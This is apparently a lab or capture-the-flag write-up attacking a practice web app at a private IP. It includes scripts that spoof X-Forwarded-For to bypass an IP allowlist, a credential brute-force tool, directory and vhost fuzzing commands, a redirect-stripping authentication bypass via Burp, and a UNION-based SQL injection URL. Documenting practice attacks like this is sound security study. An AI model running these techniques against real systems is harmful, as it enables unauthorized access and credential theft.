# target IP 192.168.86.200

![](image.png)

```py
import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)
    # 실제 나오는 응답 확인
    if "Your IP is not allowed" not in response.text:
        print(f"[-] {ip}, status: {response.status_code}")
        # 응답 본문 일부 출력
        print(response.text[:300])
    else:
        print(f"[+] {ip}, status: {response.status_code}")
         print(response.text[:300])

```

![](image_1.png)

???(kali?kali)-[~]
??$ sudo python3 requests_3.py  
[+] Found working IP: 10.10.10.0

```py
import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)

    # 에러 메시지가 포함되어 있는지 확인
    if "not allowed" not in response.text:
        print(f"[+] Found working IP: {ip}")
        print(response.text)
        break
    else:
        print(f"[-] Blocked: {ip}", end="\r")

```

![](image_2.png)

```html
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <h2>Robust Employee Manager</h2>

    <form id="login-form" method="post" target="_self">
      <div class="imgcontainer">
        <img src="emp.png" alt="Avatar" class="avatar" />
      </div>
      <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" placeholder="Enter Username" name="user" required />

        <label for="psw"><br /><b>Password</b></label>
        <input
          type="password"
          placeholder="Enter Password"
          name="password"
          required
        />

        <br /><button type="submit">Login</button>
      </div>
    </form>
  </body>
</html>
```

# burpsuite proxy header setting

![](image_4.png)

![](image_5.png)

# Bruteforce with X-Forwarded-For

![](image_6.png)
![](image_7.png)

```py
# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
import argparse

import requests


def load_lines(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def brute_force(url, xff_ip, username_file, password_file, timeout=5):
    headers = {
        "X-Forwarded-For": xff_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebkit/537.36 (KHTML, like Gecko)",
    }

    try:
        usernames = load_lines(username_file)
        passwords = load_lines(password_file)
    except FileNotFoundError as e:
        print(f"not found file {e.filename}")
        return

    total = len(usernames) * len(passwords)
    done = 0

    print(f"[+] loaded {len(usernames)}/{len(passwords)}")
    print(f"[+] total combinations: {total}")
    print("[+] starting bruteforce")

    for user in usernames:
        for pwd in passwords:
            data = {"user": user, "password": pwd}

            try:
                response = requests.post(
                    url=url, headers=headers, data=data, timeout=timeout
                )

                # print(f"code: {response.status_code}")
                if (response.status_code) == 200:
                    # print(f"found {user}/{pwd}")
                    # print(f"len content:{len(response.text)}")
                    print("200")
                if len(response.text) != 1770:
                    print(f"not 1770: {user}/{pwd}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"error: {e}")
            finally:
                # 현재 진행도를 "완료/전체" 형식으로 표시
                done += 1
                pct = (done / total) * 100 if total else 0
                print(
                    f"\r[-] progress: {done}/{total} ({pct:.1f}%)", end="", flush=True
                )

    print(f"\n[-] bruteforce finished")


def parse_args():
    parser = argparse.ArgumentParser(description="X-Forwarded-for")

    parser.add_argument("-u", "--url", default="http://127.0.0.1/login.php")

    parser.add_argument(
        "-x", "--xff", default="10.10.10.10", help="X-Forwarded-For 에 넣을 IP"
    )

    parser.add_argument(
        "-U", "--usernames", default="usernames.txt", help="user file path"
    )

    parser.add_argument(
        "-P", "--passwords", default="password.txt", help="password file path"
    )

    parser.add_argument("-t", "--timeout", type=int, default=5, help="timeout")

    return parser.parse_args()


def main():
    args = parse_args()
    brute_force(args.url, args.xff, args.usernames, args.passwords, args.timeout)


if __name__ == "__main__":
    main()

```

> python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt --passwords" "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"

- It shows all 200 status code

![It shows all 200 status code](image_8.png)

- It Shows 1770 lenth
  ![](image_9.png)
- bruteforce -> not found
  ![](image_11.png)

> sudo nmap 192.168.86.200 -Pn --open -sC -sV -O -oN scan.txt

![](image_12.png)

- -fc -> exclude

# subdomain not found

> ffuf -u http://192.168.86.200 -H "Host:FUZZ.192.168.86.200" -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 404 -t 50 > result_ffuf.txt

![](image_19.png)

# found -> ip, IP, login, Login, LOGIN, home, Home, index, Index.php

> ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -t 50

![](image_20.png)

# found -> login, nul.php

> ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/wordlists/wfuzz/general/big.txt -fc 404,302 -t 50

![](image_18.png)

# found -> home, index.php

- --sc 302 -> look only 302

> wfuzz -H "X-Forwarded-For: 10.10.10.0" --sc 302 -u http://192.168.86.200/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt

![](image_15.png)

# 192.168.86.200/home.php

# turn on intercept server to client requests

![](image_23.png)

![](image_22.png)

# remove location in response header

![](image_25d.png)

# arrived at 192.168.86.200/home.php

![](image_26.png)

- 1 Desireef Joubert 2007-04-01
  2 Blythe Weatherall 2007-05-10
  3 Felisha Bookman 2006-03-12
  4 Natacha Pua 2007-11-24
  5 Chante Fenske 2007-12-28

# set response Location: login.php -> "" in burpsuite

![](image_27.png)

![](image_28.png)
![](image_29.png)

- Id First name Last name Birth date Actions
  6 Amado Grimaldi 2007-06-18
  7 Valery Files 2007-03-08
  8 Taryn Carbone 2007-08-01
  9 Julissa Spengler 2007-01-31
  10 Brain Spagnuolo 2007-09-23

# try SQLI

> http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=

![](image_30.png)
